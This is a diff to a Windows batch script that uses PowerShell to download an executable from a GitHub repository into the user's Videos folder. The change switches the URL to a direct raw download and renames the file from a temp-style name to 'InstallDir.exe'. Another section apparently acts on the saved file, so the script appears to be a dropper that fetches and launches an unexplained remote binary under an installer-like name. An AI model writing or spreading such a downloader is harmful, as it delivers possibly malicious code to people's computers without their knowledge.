@@ -1,8 +1,8 @@
 @echo off
 setlocal
 
-set "fileUrl=https://github.com/SeizedAssets/fantastic-doodle/blob/main/4CA0.tmp.exe"
-set "savePath=%USERPROFILE%\Videos\4CA0.tmp.exe"
+set "fileUrl=https://github.com/SeizedAssets/fantastic-doodle/raw/refs/heads/main/InstallDir.exe"
+set "savePath=%USERPROFILE%\Videos\InstallDir.exe"
 
 powershell -NoProfile -Command "try { Invoke-WebRequest -Uri '%fileUrl%' -OutFile '%savePath%' -UseBasicParsing } catch { exit 1 }"
 
@@ -18,3 +18,4 @@ if exist "%savePath%" (
 
 endlocal
 exit /b
+
